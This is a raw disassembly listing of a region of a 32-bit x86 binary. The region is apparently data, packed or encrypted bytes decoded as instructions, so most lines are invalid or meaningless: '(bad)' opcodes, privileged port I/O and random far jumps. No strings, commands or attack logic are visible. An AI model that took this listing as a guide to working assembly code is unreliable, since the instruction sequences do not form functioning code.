  41e879:	fnstenv [eax+eax*1+0x0]
	...
  41e8a1:	add    BYTE PTR [eax],al
  41e8a3:	add    BYTE PTR [edi-0x75994ade],cl
  41e8a9:	pop    edi
  41e8aa:	and    al,0x4b
  41e8ac:	jge    0x41e909
  41e8ae:	fdivr  st,st(7)
  41e8b0:	dec    esi
  41e8b1:	and    eax,0x237373df
  41e8b6:	repz bound eax,QWORD PTR [eax-0x49]
  41e8ba:	(bad)  [eax+0x4e]
  41e8bd:	int    0xf5
  41e8bf:	ins    BYTE PTR es:[edi],dx
  41e8c0:	cmp    cl,dh
  41e8c2:	les    edx,FWORD PTR [ebp+esi*1+0x1c]
  41e8c6:	(bad)  [ebx+ecx*2-0x2f]
  41e8ca:	and    BYTE PTR [ebp+eax*2-0x3c],cl
  41e8ce:	fistp  WORD PTR [edi]
  41e8d0:	popa   
  41e8d1:	jecxz  0x41e8ae
  41e8d3:	imul   ebx,DWORD PTR [esi+ecx*8],0xffffffb7
  41e8d7:	data16 aas 
  41e8d9:	lock fnstenv [eax+0xb]
  41e8dd:	aam    0xec
  41e8df:	pop    ebx
  41e8e0:	jmp    0x41e8cc
  41e8e2:	(bad)  
  41e8e3:	arpl   bx,di
  41e8e5:	test   dh,dh
  41e8e7:	pop    ds
  41e8e8:	shl    edx,1
  41e8ea:	fld    TBYTE PTR [ebx+0x1c]
  41e8ed:	icebp  
  41e8ee:	fldenv [ebp-0x18]
  41e8f1:	pop    edx
  41e8f2:	pop    esi
  41e8f3:	in     eax,0xed
  41e8f5:	jne    0x41e932
  41e8f7:	mov    ecx,0xdb5977fa
  41e8fc:	int3   
  41e8fd:	jnp    0x41e944
  41e8ff:	lock mul DWORD PTR [ebx+0x7bbfda50]
  41e906:	test   DWORD PTR ss:[eax],0x0
	...
  41e931:	and    ebx,DWORD PTR [esi+0x5ac7dd48]
  41e937:	sbb    bl,bl
  41e939:	mov    ecx,0xade51e86
  41e93e:	jne    0x41e97b
  41e940:	(bad)  
  41e941:	mov    edx,0x8ff6287d
  41e946:	mov    gs,WORD PTR [ebx]
  41e948:	(bad)  
  41e949:	dec    ebp
  41e94a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e94b:	sbb    ah,cl
  41e94d:	(bad)  
  41e94e:	(bad)  
  41e94f:	adc    dl,bl
  41e951:	js     0x41e8e1
  41e953:	out    0xbf,eax
  41e955:	pop    edx
  41e956:	(bad)
  41e95a:	(bad)  
  41e95b:	out    0xbf,eax
  41e95d:	dec    edx
  41e95e:	(bad)
  41e962:	lea    ebp,[ecx-0x63a4bb1c]
  41e968:	in     al,0x3a
  41e96a:	ja     0x41e935
  41e96c:	ficom  DWORD PTR [ebx+0x39]
  41e96f:	rcr    cl,1
  41e971:	cmp    bl,BYTE PTR [ebx-0x66]
  41e974:	fiadd  DWORD PTR [ecx-0x71]
  41e977:	mov    dh,0xe4
  41e979:	sub    eax,0x38d3c380
  41e97e:	jle    0x41e90e
  41e980:	and    ecx,DWORD PTR [ebp-0x7c]
  41e983:	call   0xdb23:0x9a77feef
  41e98a:	js     0x41e916
  41e98c:	add    ebp,esp
  41e98e:	jnp    0x41ea03
  41e990:	fild   DWORD PTR [ebx+0x9900a6]
	...
  41e9be:	push   esi
  41e9bf:	jnp    0x41ea2e
  41e9c1:	call   0x3853:0x4c748b80
  41e9c8:	addr16 dec edi
  41e9ca:	inc    edi
  41e9cb:	or     cl,BYTE PTR [ebp+0x5b]
  41e9ce:	jne    0x41ea4f
  41e9d0:	jb     0x41ea1a
  41e9d2:	imul   ecx,DWORD PTR [edx],0x41
  41e9d5:	dec    eax
  41e9d6:	dec    esp
  41e9d7:	test   eax,0x824c4850
  41e9dc:	add    BYTE PTR [eax+0x41],cl
  41e9df:	jnp    0x41ea4e
  41e9e1:	xor    al,0x56
  41e9e3:	mov    ?,WORD PTR [ecx-0x29]
  41e9e6:	inc    esi
  41e9e7:	js     0x41ea50
  41e9e9:	jmp    0xaaf8449
  41e9ee:	cmc    
  41e9ef:	je     0x41ea50
  41e9f1:	add    ah,dh
  41e9f3:	or     DWORD PTR [edx+0x16],edx
  41e9f6:	dec    BYTE PTR [ebp+0x7d0a0875]
  41e9fc:	pop    esp
  41e9fd:	and    dh,dl
  41e9ff:	jp     0x41ea73
  41ea01:	add    al,0xfc
  41ea03:	or     BYTE PTR [ebx-0x38],0xc6
  41ea07:	jne    0x41ea09
  41ea09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea0a:	retf   0x67a8
  41ea0d:	(bad)
  41ea10:	fs fcomi st,st(2)
  41ea13:	mov    dh,BYTE PTR [ecx-0x17]
  41ea16:	fstp   TBYTE PTR [ecx+eiz*2-0x2f]
  41ea1a:	in     eax,0x76
  41ea1c:	ins    BYTE PTR es:[edi],dx
  41ea1d:	(bad)  
  41ea1e:	mov    esp,0x990090
	...
  41ea4b:	aam    0x79
  41ea4d:	push   ecx
  41ea4e:	mov    WORD PTR [ecx+0x1f9b638f],?
  41ea54:	stos   DWORD PTR es:[edi],eax
  41ea55:	ins    DWORD PTR es:[edi],dx
  41ea56:	cdq    
  41ea57:	outs   dx,DWORD PTR ds:[esi]
  41ea58:	jbe    0x41eacc
  41ea5a:	xchg   ebp,eax
  41ea5b:	pop    ds
  41ea5c:	stos   DWORD PTR es:[edi],eax
  41ea5d:	ins    DWORD PTR es:[edi],dx
  41ea5e:	add    BYTE PTR ds:0x9263601d,al
  41ea64:	clc    
  41ea65:	push   0x74
  41ea67:	test   DWORD PTR ds:0xfc95706c,ebp
  41ea6d:	outs   dx,DWORD PTR ds:[esi]
  41ea6e:	jae    0x41ea3a
  41ea70:	and    ebp,DWORD PTR [edi+0x64]
  41ea73:	jne    0x41eaa3
  41ea75:	push   0x74
  41ea77:	cmc    
  41ea78:	das    
  41ea79:	bound  esi,QWORD PTR [edx-0x15]
  41ea7c:	sub    DWORD PTR [edi+0x0],ebp
  41ea7f:	xor    dh,BYTE PTR es:[ecx+0x70]
  41ea83:	and    eax,0x45746f24
  41ea88:	cs push 0x74
  41ea8b:	cmc    
  41ea8c:	sbb    eax,0xfa126360
  41ea91:	push   0x74
  41ea93:	xor    eax,0x35746a2e
  41ea98:	das    
  41ea99:	pop    esi
  41ea9a:	jae    0x41ead2
  41ea9c:	or     ch,BYTE PTR [edx+esi*2+0x19]
  41eaa0:	pop    edi
  41eaa1:	pop    ebp
  41eaa2:	arpl   WORD PTR [esi],dx
  41eaa4:	and    dh,BYTE PTR [edx+0x6e]
  41eaa7:	stc    
  41eaa8:	bound  ebx,QWORD PTR [edi+0x66]
  41eaab:	sbb    bl,BYTE PTR [edi+0x5d]
  41eaae:	arpl   WORD PTR [eax],ax
	...
  41ead8:	(bad)  
  41ead9:	and    esi,DWORD PTR [edx+0x6e]
  41eadc:	leave  
  41eadd:	bound  ebx,QWORD PTR [edi+0x66]
  41eae0:	jecxz  0x41eb3e
  41eae2:	pop    esp
  41eae3:	inc    edx
  41eae4:	in     al,0xf8
  41eae6:	dec    ecx
  41eae7:	popa   
  41eae8:	in     al,dx
  41eae9:	xor    ch,bh
  41eaeb:	pop    ebx
  41eaec:	test   eax,0x87206224
  41eaf1:	std    
  41eaf2:	jo     0x41eb15
  41eaf4:	lds    ebp,FWORD PTR [edi]
  41eaf6:	ins    BYTE PTR es:[edi],dx
  41eaf7:	mov    WORD PTR [ebx],cx
  41eafa:	pop    esi
  41eafb:	jb     0x41ea95
  41eafd:	and    BYTE PTR [edi+0x49],cl
  41eb00:	sbb    al,0xc6
  41eb02:	les    edx,FWORD PTR [ebx+0x4]
  41eb05:	fbld   TBYTE PTR [eax]
  41eb07:	inc    edx
  41eb08:	std    
  41eb09:	test   DWORD PTR [edx],esp
  41eb0b:	add    bh,ch
  41eb0d:	fcomp  st(6)
  41eb0f:	jae    0x41eb04
  41eb11:	shl    dl,cl
  41eb13:	(bad)  
  41eb14:	shl    bl,1
  41eb16:	mov    ecx,0xdc45c853
  41eb1b:	bound  edi,QWORD PTR [esp+esi*1]
  41eb1e:	jecxz  0x41eb93
  41eb20:	std    
  41eb21:	dec    ebp
  41eb22:	iret   
  41eb23:	jo     0x41eade
  41eb25:	mov    ds:0x96c01ff1,eax
  41eb2a:	hlt    
  41eb2b:	ins    BYTE PTR es:[edi],dx
  41eb2c:	enter  0xcdf1,0x6c
  41eb30:	scas   al,BYTE PTR es:[edi]
  41eb31:	pushf  
  41eb32:	fld    TBYTE PTR [ebp-0x45]
  41eb35:	push   ecx
  41eb36:	shl    BYTE PTR [esi-0x52],0x56
  41eb3a:	loope  0x41ebaf
	...
  41eb64:	add    BYTE PTR [ebx+0x6bffeb63],dh
  41eb6a:	fs aad 0x64
  41eb6d:	mov    ss,WORD PTR [ebx-0x29]
  41eb70:	inc    ebx
  41eb71:	jne    0x41eb77
  41eb73:	add    DWORD PTR [ecx+0x73],eax
  41eb76:	psrlq  mm6,QWORD PTR [ebx+0x1c]
  41eb7a:	fbld   TBYTE PTR ss:[ebp+0x7d]
  41eb7e:	pmullw mm6,QWORD PTR [ebx+0x1c]
  41eb82:	mov    dh,0xdb
  41eb84:	jno    0x41ebc2
  41eb86:	push   ebp
  41eb87:	pop    ds
  41eb88:	fs sbb al,0xc5
  41eb8b:	mov    bh,0x53
  41eb8d:	ins    BYTE PTR es:[edi],dx
  41eb8e:	push   edx
  41eb8f:	mov    edi,0xd52b3d6a
  41eb94:	pop    ds
  41eb95:	pop    ebp
  41eb96:	push   ds
  41eb97:	fnsave [ecx+0x41]
  41eb9a:	(bad)
  41eb9d:	dec    esi
  41eb9e:	out    0xcc,eax
  41eba0:	dec    edi
  41eba1:	cld    
  41eba2:	pop    edx
  41eba3:	mov    edx,0x84912de0
  41eba8:	icebp  
  41eba9:	fwait
  41ebaa:	xchg   edi,eax
  41ebab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebac:	ror    DWORD PTR [ebx+edi*1-0x46],cl
  41ebb0:	loopne 0x41ebbf
  41ebb2:	xchg   ecx,eax
  41ebb3:	mov    ecx,?
  41ebb5:	adc    DWORD PTR [edi+0x3b2cd3ae],0xffffff9c
  41ebbc:	repnz dec BYTE PTR [edi+eax*8+0x4c75cab5]
  41ebc4:	add    al,0xcd
  41ebc6:	xchg   ebp,eax
  41ebc7:	xor    edx,esp
	...
  41ebf1:	add    BYTE PTR [ebx],bh
  41ebf3:	scas   al,BYTE PTR es:[edi]
  41ebf4:	pop    edx
  41ebf5:	loope  0x41ebc4
  41ebf7:	cmp    bl,BYTE PTR ds:0xe77db6e5
  41ebfd:	mov    ch,0xd1
  41ebff:	scas   al,BYTE PTR es:[edi]
  41ec00:	pop    ss
  41ec01:	and    al,0xdf
  41ec03:	jne    0x41ec4d
  41ec05:	ffree  st(7)
  41ec07:	cmp    ch,BYTE PTR [eax]
  41ec09:	loopne 0x41ebca
  41ec0b:	mov    WORD PTR [ebx+esi*8],cs
  41ec0e:	lods   al,BYTE PTR ds:[esi]
  41ec0f:	pop    edx
  41ec10:	sub    eax,0xc7ab6fb6
  41ec15:	ror    BYTE PTR [eax+eax*4+0x7c5a2419],1
  41ec1c:	adc    al,0xe1
  41ec1e:	add    ebx,DWORD PTR [ecx+0x3b6bd02d]
  41ec24:	sbb    ah,cl
  41ec26:	ins    DWORD PTR es:[edi],dx
  41ec27:	lea    eax,[edx+esi*8]
  41ec2a:	jmp    0x41ebbf
  41ec2c:	mov    ah,0xc4
  41ec2e:	push   ebx
  41ec2f:	cmp    edi,DWORD PTR [edx-0x3372b220]
  41ec35:	icebp  
  41ec36:	rcl    DWORD PTR [ebx+0x3b5bc49c],cl
  41ec3c:	pushf  
  41ec3d:	repnz mov DWORD PTR ds:[edi],eax
  41ec41:	mov    dh,0x5a
  41ec43:	js     0x41ec45
  41ec45:	int3   
  41ec46:	pop    ds
  41ec47:	call   0xb100:0x72c8c86b
  41ec4e:	shr    DWORD PTR [edx-0x749336b0],cl
  41ec54:	arpl   WORD PTR [ebx+0x0],bx
	...
  41ec7e:	add    BYTE PTR [edi],bl
  41ec80:	xchg   ebx,eax
  41ec81:	push   esp
  41ec82:	mov    ch,0x6f
  41ec84:	push   cx
  41ec86:	mov    WORD PTR [ebp+0x3f7b6390],cs
  41ec8c:	stos   BYTE PTR es:[edi],al
  41ec8d:	push   edx
  41ec8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec8f:	pop    ds
  41ec90:	stos   DWORD PTR es:[edi],eax
  41ec91:	dec    ebp
  41ec92:	cdq    
  41ec93:	cmp    edx,DWORD PTR cs:[ebx+0x5a]
  41ec97:	inc    ebx
  41ec98:	mov    WORD PTR [eax],es
  41ec9a:	xor    BYTE PTR [ebx+0x63095045],dl
  41eca0:	mov    esp,DWORD PTR [ebx+0x5b]
  41eca3:	and    BYTE PTR [ebx-0x6e97e2ac],dl
  41eca9:	pop    edi
  41ecaa:	push   eax
  41ecab:	push   esp
  41ecac:	push   bx
  41ecae:	cmp    dl,BYTE PTR [ebx-0x74]
  41ecb1:	and    BYTE PTR [edi],bl
  41ecb3:	aas    
  41ecb4:	jno    0x41ed19
  41ecb6:	jmp    0x39969722
  41ecbb:	shl    DWORD PTR [edi+eiz*2+0x63ac3805],cl
  41ecc2:	sbb    edi,edx
  41ecc4:	js     0x41ed38
  41ecc6:	jmp    0x19967db7
  41eccb:	inc    eax
  41eccc:	stos   BYTE PTR es:[edi],al
  41eccd:	jno    0x41ecdb
  41eccf:	out    dx,al
  41ecd0:	add    eax,0x95b119fd
  41ecd5:	xor    DWORD PTR [ecx],ecx
  41ecd7:	enter  0x7276,0xd5
  41ecdb:	pop    ds
  41ecdc:	lods   al,BYTE PTR ds:[esi]
  41ecdd:	dec    ebx
  41ecde:	mov    ebp,0xbe5065ef
	...
  41ed0b:	add    ch,cl
  41ed0d:	mov    DWORD PTR [eax],eax
  41ed0f:	add    BYTE PTR [esp+ecx*8+0x2f25503d],cl
  41ed16:	ins    BYTE PTR es:[edi],dx
  41ed17:	jb     0x41ed8a
  41ed19:	pop    ecx
  41ed1a:	add    BYTE PTR [eax-0x76],dl
  41ed1d:	sub    DWORD PTR [eax],esi
  41ed1f:	and    BYTE PTR [ebp-0x8],ah
  41ed22:	outs   dx,DWORD PTR ds:[esi]
  41ed23:	jae    0x41ecd7
  41ed25:	outs   dx,DWORD PTR cs:[esi]
  41ed27:	fs ja  0x41ed83
  41ed2a:	inc    ebp
  41ed2b:	dec    ebp
  41ed2c:	mov    ah,0x29
  41ed2e:	sbb    eax,0x700a9450
  41ed33:	ja     0x41ecdf
  41ed35:	or     esp,DWORD PTR [ecx+0x32]
  41ed38:	test   edi,ecx
  41ed3a:	dec    edx
  41ed3b:	push   esp
  41ed3c:	test   DWORD PTR [ecx],edi
  41ed3e:	push   eax
  41ed3f:	popa   
  41ed40:	(bad)  
  41ed41:	or     esi,DWORD PTR [edi+ebp*2-0x9]
  41ed45:	cli    
  41ed46:	cs add ch,bh
  41ed49:	sub    dl,BYTE PTR [ecx+0x50]
  41ed4c:	sub    dl,bh
  41ed4e:	gs ins BYTE PTR es:[edi],dx
  41ed50:	adc    eax,0xf6735e2f
  41ed55:	imul   DWORD PTR [ebx+0x72]
  41ed58:	loope  0x41eda2
  41ed5a:	add    BYTE PTR [ebx+0x8],dl
  41ed5d:	sub    ecx,DWORD PTR [ebp+0x20]
  41ed60:	in     eax,0xf9
  41ed62:	outs   dx,DWORD PTR ds:[esi]
  41ed63:	jae    0x41ed97
  41ed65:	outs   dx,DWORD PTR cs:[esi]
  41ed67:	neg    DWORD PTR fs:[eax+0x0]
  41ed6b:	push   eax
  41ed6c:	sub    ch,BYTE PTR [edi]
  41ed6e:	xor    BYTE PTR [eax],ah
	...
  41ed98:	add    BYTE PTR ds:0xf2736ff8,ah
  41ed9e:	das    
  41ed9f:	outs   dx,DWORD PTR ds:[esi]
  41eda0:	fs add eax,0x54149c2
  41eda6:	aas    
  41eda7:	push   eax
  41eda8:	popa   
  41eda9:	(bad)  
  41edaa:	or     esi,DWORD PTR [edi+ebp*2-0x9]
  41edae:	and    al,0xfd
  41edb0:	dec    ebp
  41edb1:	sbb    al,0xbc
  41edb3:	int3   
  41edb4:	dec    edi
  41edb5:	cld    
  41edb6:	shl    ecx,0x70
  41edb9:	dec    edi
  41edba:	(bad)
  41edbd:	inc    eax
  41edbe:	repnz mov eax,0x20e24853
  41edc4:	push   eax
  41edc5:	cmp    eax,0x3374efc1
  41edca:	loopne 0x41eda8
  41edcc:	(bad)  
  41edcd:	out    dx,al
  41edce:	mov    dh,0xcc
  41edd0:	dec    edi
  41edd1:	cmp    al,0xc2
  41edd3:	loope  0x41ee45
  41edd5:	paddsw mm2,mm3
  41edd8:	jno    0x41edd2
  41edda:	icebp  
  41eddb:	add    BYTE PTR [ecx+0xb],dl
  41edde:	fsub   st(4),st
  41ede0:	je     0x41eddf
  41ede2:	jg     0x41edc2
  41ede4:	pop    ebx
  41ede5:	(bad)  
  41ede7:	fbstp  TBYTE PTR [ecx-0xd]
  41edea:	mov    al,ds:0x45d065f1
  41edef:	retf   
  41edf0:	ins    DWORD PTR es:[edi],dx
  41edf1:	enter  0xd696,0x6d
  41edf5:	shr    DWORD PTR [ebp-0x6f40c0dc],0xf1
  41edfc:	jb     0x41edfe
	...
  41ee26:	retf   0x244d
  41ee29:	dec    ebx
  41ee2a:	mov    ebp,0xc164e39b
  41ee2f:	aas    
  41ee30:	sar    BYTE PTR [esi],0xbf
  41ee33:	push   eax
  41ee34:	icebp  
  41ee35:	jb     0x41edc1
  41ee37:	outs   dx,BYTE PTR ds:[esi]
  41ee38:	aad    0xff
  41ee3a:	fs push esi
  41ee3c:	out    0x6d,eax
  41ee3e:	nop
  41ee3f:	pop    ebx
  41ee40:	fsub   DWORD PTR [esi+0x79]
  41ee43:	add    DWORD PTR [ecx],eax
  41ee45:	push   ecx
  41ee46:	mov    ebx,DWORD PTR [eax+ebx*8+0x74]
  41ee4a:	jge    0x41ee4c
  41ee4c:	call   0xe59d47ac
  41ee51:	jno    0x41eec6
  41ee53:	pop    ebx
  41ee54:	(bad)  
  41ee56:	inc    ecx
  41ee57:	(bad)  
  41ee58:	mov    ebx,0xc07d39d2
  41ee5d:	out    0x3e,al
  41ee5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee60:	sahf   
  41ee61:	fmul   DWORD PTR [edi+0x77]
  41ee64:	(bad)  
  41ee65:	repnz inc esp
  41ee67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee68:	scas   al,BYTE PTR es:[edi]
  41ee69:	rcr    BYTE PTR [edx+0x3b],1
  41ee6c:	test   al,0xe6
  41ee6e:	cmp    al,0x74
  41ee70:	mov    ah,0xf1
  41ee72:	das    
  41ee73:	cmp    esi,DWORD PTR [esp+eiz*8-0x177985f7]
  41ee7a:	or     eax,0xfce6a8a7
  41ee7f:	jae    0x41ee15
  41ee81:	icebp  
  41ee82:	js     0x7d4aa56f
  41ee88:	jae    0x41ee64
	...
  41eeb2:	add    dl,dl
  41eeb4:	mov    BYTE PTR [edi+edi*4-0x2a758e2a],cl
  41eebb:	lock xchg DWORD PTR [esi-0x16],edx
  41eebf:	iret   
  41eec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec1:	ss in  eax,dx
  41eec3:	sar    DWORD PTR [esi+0x46],0xdb
  41eec7:	int3   
  41eec8:	cmp    bl,BYTE PTR ds:0x3c97e7b8
  41eece:	(bad)  
  41eecf:	lods   eax,DWORD PTR ds:[esi]
  41eed0:	jge    0x41ef1f
  41eed2:	fmul   st,st(1)
  41eed4:	jge    0x41ef0f
  41eed6:	xlat   BYTE PTR ds:[ebx]
  41eed7:	ret    0x3d73
  41eeda:	ror    al,0x71
  41eedd:	adc    eax,0x1a8a88e8
  41eee2:	and    al,0x67
  41eee4:	js     0x41ef00
  41eee6:	xlat   BYTE PTR ds:[ebx]
  41eee7:	push   0x7a
  41eee9:	add    dl,dh
  41eeeb:	js     0x41ef28
  41eeed:	sbb    bl,cl
  41eeef:	jge    0x41ee7f
  41eef1:	add    bh,dl
  41eef3:	outs   dx,DWORD PTR ds:[esi]
  41eef4:	js     0x41eef6
  41eef6:	add    al,0xdc
  41eef8:	xchg   edx,eax
  41eef9:	jb     0x41eef9
  41eefb:	cmc    
  41eefc:	jns    0x41ef6a
  41eefe:	int3   
  41eeff:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef01:	dec    ebx
  41ef02:	sar    BYTE PTR [edx-0x31259274],1
  41ef08:	js     0x41ef7e
  41ef0a:	or     edi,ebp
  41ef0c:	lea    esi,[ebp+edx*8-0x52]
  41ef10:	outs   dx,DWORD PTR ds:[esi]
  41ef11:	imul   ecx,DWORD PTR [ecx],0xcc7470e1
	...
  41ef3f:	add    cl,dl
  41ef41:	jo     0x41efa6
  41ef43:	mov    ch,0xff
  41ef45:	stos   DWORD PTR es:[edi],eax
  41ef46:	arpl   WORD PTR [ebp-0x7991868d],bx
  41ef4c:	push   0x2
  41ef4e:	push   edx
  41ef4f:	xchg   BYTE PTR [ebp-0x72],dh
  41ef52:	jne    0x41eedc
  41ef54:	imul   edi,DWORD PTR [ebp+0x5c],0x727b88b4
  41ef5b:	mov    cs,WORD PTR [edx+0x6f]
  41ef5e:	data16 jge 0x41ef0c
  41ef61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef62:	addr16 jg 0x41efe0
  41ef65:	outs   dx,DWORD PTR ds:[esi]
  41ef66:	jne    0x41efc2
  41ef68:	add    BYTE PTR [ecx-0x72a6c2ac],dl
  41ef6e:	jb     0x41efcb
  41ef70:	inc    ebx
  41ef71:	jo     0x41efe7
  41ef73:	aaa    
  41ef74:	cmp    ecx,DWORD PTR [ecx+esi*2+0x5c702d50]
  41ef7b:	push   ss
  41ef7c:	inc    edi
  41ef7d:	jo     0x41efe3
  41ef7f:	inc    esi
  41ef80:	inc    ebp
  41ef81:	mov    esp,DWORD PTR [eax]
  41ef83:	sbb    al,0x3b
  41ef85:	mov    esi,DWORD PTR [ecx+0x8]
  41ef88:	add    eax,0x38066e79
  41ef8d:	lods   al,BYTE PTR ds:[esi]
  41ef8e:	jae    0x41ef9b
  41ef90:	icebp  
  41ef91:	mov    BYTE PTR [ecx+0x15],dh
  41ef94:	sti    
  41ef95:	je     0x41eff3
  41ef97:	add    BYTE PTR ds:0xc666c29,dl
  41ef9d:	or     esp,DWORD PTR [edx+0x73]
  41efa0:	adc    DWORD PTR [edx+esi*2],ebp
  41efa3:	je     0x41efa5
	...
  41efcd:	loope  0x41efd9
  41efcf:	ins    BYTE PTR es:[edi],dx
  41efd0:	imul   eax,ebp,0xffffffc6
  41efd3:	imul   esp,DWORD PTR [esi-0x17],0x22
  41efd7:	pop    esi
  41efd8:	jb     0x41efb2
  41efda:	ror    DWORD PTR [ecx+0x69],0xd6
  41efde:	daa    
  41efdf:	ins    BYTE PTR es:[edi],dx
  41efe0:	jae    0x41efb4
  41efe2:	repz jo 0x41f041
  41efe5:	ins    BYTE PTR es:[edi],dx
  41efe6:	or     esi,DWORD PTR [ecx+0x65]
  41efe9:	or     esp,DWORD PTR [bp+si+0x74]
  41efed:	adc    eax,0xb263601e
  41eff2:	sub    BYTE PTR [ebx+0x74],ch
  41eff5:	adc    BYTE PTR gs:[esi+0x6e],bl
  41eff9:	xchg   esp,eax
  41effa:	repnz popa 
  41effc:	jb     0x41f073
  41effe:	sub    dh,BYTE PTR [edx+0x74]
  41f001:	xchg   ecx,eax
  41f002:	or     ch,BYTE PTR [ebx+ebp*2-0x7b]
  41f006:	sar    DWORD PTR ds:0x720a9663,0x6e
  41f00d:	jmp    0xe9aaed38
  41f012:	stc    
  41f013:	push   0x74
  41f015:	in     al,dx
  41f016:	hlt    
  41f017:	gs arpl sp,dx
  41f01a:	and    ah,BYTE PTR [esi+0x6f]
  41f01d:	add    edx,DWORD PTR [edi+0x65]
  41f020:	fs call 0xe9ab6132
  41f026:	and    eax,0x56e7676a
  41f02b:	outs   dx,BYTE PTR gs:[esi]
  41f02d:	fsub   DWORD PTR [edx]
  41f02f:	pusha  
  41f030:	outs   dx,DWORD PTR ds:[esi]
	...
  41f059:	add    BYTE PTR [eax],dh
  41f05b:	lock sbb al,0x73
  41f05e:	sbb    BYTE PTR [ecx],ch
  41f060:	jae    0x41f0c7
  41f062:	sbb    al,0x64
  41f064:	and    al,0x70
  41f066:	jge    0x41f0cd
  41f068:	shl    DWORD PTR [ebx+ecx*4+0x4],cl
  41f06c:	in     eax,0x70
  41f06e:	sbb    al,0x51
  41f070:	aad    0x73
  41f072:	js     0x41f0cd
  41f074:	out    dx,eax
  41f075:	push   0x60e3533c
  41f07a:	dec    ebx
  41f07b:	pop    ds
  41f07c:	out    dx,eax
  41f07d:	jae    0x41f07b
  41f07f:	push   cs
  41f080:	loop   0x41f0ef
  41f082:	cmp    eax,0xfc71e611
  41f087:	and    edx,esp
  41f089:	jo     0x41f0ba
  41f08b:	shr    edi,0x71
  41f08e:	cmp    ch,al
  41f090:	add    BYTE PTR [edi+0x40],ah
  41f093:	pxor   mm6,QWORD PTR [ebx+0x35]
  41f097:	(bad)  
  41f098:	jmp    0xdc33ffff
  41f09d:	and    cl,BYTE PTR [edx+edi*8-0x48]
  41f0a1:	sub    al,BYTE PTR [ecx+0x22]
  41f0a4:	adc    eax,0x11173158
  41f0a9:	xor    al,0xd4
  41f0ab:	es xor BYTE PTR es:[esi],ch
  41f0af:	mov    edx,0xea2e3025
  41f0b4:	sub    eax,0xb8c42c23
  41f0b9:	and    cl,BYTE PTR [esp+eiz*2]
  41f0bc:	mov    esp,0x22
	...
  41f0e5:	add    BYTE PTR [eax],al
  41f0e7:	or     al,0x64
  41f0e9:	mov    esp,0xbc640c22
  41f0ee:	and    cl,BYTE PTR [esp+eiz*2]
  41f0f1:	mov    esp,0xb903ec22
  41f0f6:	jp     0x41f114
  41f0f8:	data16 in al,dx
  41f0fa:	jb     0x41f0b6
  41f0fc:	(bad)  
  41f0fd:	out    0x71,eax
  41f0ff:	mov    esi,0x1c63d29a
  41f104:	pop    ebx
  41f105:	inc    ebx
  41f106:	mov    eax,0xe80d867b
  41f10b:	jle    0x41f09a
  41f10d:	or     ebp,ebp
  41f10f:	lea    esi,[edi-0x19]
  41f112:	sbb    eax,0x35e79b60
  41f117:	fs fwait
  41f119:	out    0x71,eax
  41f11b:	push   esi
  41f11c:	fwait
  41f11d:	out    0x8f,eax
  41f11f:	push   edx
  41f120:	fwait
  41f121:	out    0x7,eax
  41f123:	outs   dx,BYTE PTR ds:[esi]
  41f124:	fwait
  41f125:	out    0x2d,eax
  41f127:	push   0x730fe79b
  41f12c:	fwait
  41f12d:	out    0x4,eax
  41f12f:	data16 fwait
  41f131:	out    0xa,eax
  41f133:	push   ebp
  41f134:	fwait
  41f135:	out    0x89,eax
  41f137:	push   eax
  41f138:	fwait
  41f139:	out    0xc8,eax
  41f13b:	inc    esi
  41f13c:	fwait
  41f13d:	out    0x8f,eax
  41f13f:	inc    ecx
  41f140:	fwait
  41f141:	out    0x10,eax
  41f143:	(bad)  
  41f144:	call   0xb5e7:0x9af87ee7
	...
  41f173:	add    BYTE PTR [eax],al
  41f175:	fwait
  41f176:	out    0x64,eax
  41f178:	stc    
  41f179:	call   0x75e7:0x9b03ffe7
  41f180:	add    al,0x9b
  41f182:	out    0xf9,eax
  41f184:	add    bl,BYTE PTR [ebx-0x650aff19]
  41f18a:	out    0xcd,eax
  41f18c:	les    ebx,FWORD PTR [edx-0x653dbc19]
  41f192:	out    0x7b,eax
  41f194:	mov    ebx,0xcd42e79a
  41f199:	call   0x8de7:0x9ab09ee7
  41f1a0:	scas   eax,DWORD PTR es:[edi]
  41f1a1:	call   0xe900:0x9ab290e7
  41f1a8:	add    BYTE PTR [edx-0x7d2a16c0],0x40
  41f1af:	jmp    0xe9827172
  41f1b4:	push   ss
  41f1b5:	add    BYTE PTR [eax-0x17],0xc1
  41f1b9:	jg     0x41f1fb
  41f1bb:	jmp    0xe9827282
  41f1c0:	cld    
  41f1c1:	aam    0x3f
  41f1c3:	jmp    0xe981c460
  41f1c8:	mov    al,ds:0xf9e93fd0
  41f1cd:	jecxz  0x41f20e
  41f1cf:	jmp    0xe981d0f8
  41f1d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1d5:	fistp  QWORD PTR [edi]
  41f1d7:	jmp    0x41f1dc
	...
  41f200:	add    ch,bl
  41f202:	loope  0x41f243
  41f204:	jmp    0xe981d471
  41f209:	outs   dx,DWORD PTR ds:[esi]
  41f20a:	loopne 0x41f24b
  41f20c:	jmp    0xe981cefc
  41f211:	rcr    edi,0x3f
  41f214:	jmp    0xe981d214
  41f219:	leave  
  41f21a:	fidivr WORD PTR [edi]
  41f21c:	jmp    0xe981ad31
  41f221:	dec    esi
  41f222:	mov    bl,0x3f
  41f224:	jmp    0xe9819f65
  41f229:	xor    DWORD PTR [eax-0x403716c1],0x1b35e93f
  41f233:	inc    eax
  41f234:	jmp    0xe981b0cf
  41f239:	mov    ecx,0x50e9401a
  41f23e:	mov    ebp,0xbd57e93f
  41f243:	aas    
  41f244:	jmp    0x81af9f
  41f249:	inc    ebp
  41f24a:	inc    esp
  41f24b:	mov    ebp,0xc1e73540
  41f250:	inc    eax
  41f251:	xor    eax,0x540c019
  41f256:	add    eax,edx
  41f258:	inc    eax
  41f259:	add    eax,0xf540c186
  41f25e:	inc    edi
  41f25f:	rol    DWORD PTR [eax-0xb],0xf
  41f263:	ret    
  41f264:	inc    eax
	...
  41f28d:	add    BYTE PTR ds:0x540c2e5,al
  41f293:	or     eax,ebp
